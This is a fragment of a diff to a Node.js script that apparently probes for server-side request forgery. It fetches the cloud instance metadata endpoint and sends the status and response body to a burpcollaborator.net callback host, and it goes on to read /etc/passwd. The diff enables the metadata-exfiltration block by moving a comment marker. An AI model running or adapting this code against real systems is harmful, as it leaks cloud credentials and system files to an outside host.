@@ -46,16 +46,16 @@ request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=St
 }
 });
 
-
+*/
 var request = require('request');
-request('http://[::169.254.169.254]:80/', function (error, response, body) {
+request('http://instance-data/', function (error, response, body) {
   if (1 == 1) {
     console.log(response.statusCode);
     console.log(response.body);    // Prints the JSON object
 request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=Status:'+ response.statusCode + 'Response:' +response.body); 
 }
 });
-*/
+
 var request = require('request');
 const fs = require('fs')
 fs.readFile('/etc/passwd', 'utf8' , (err, data) => {
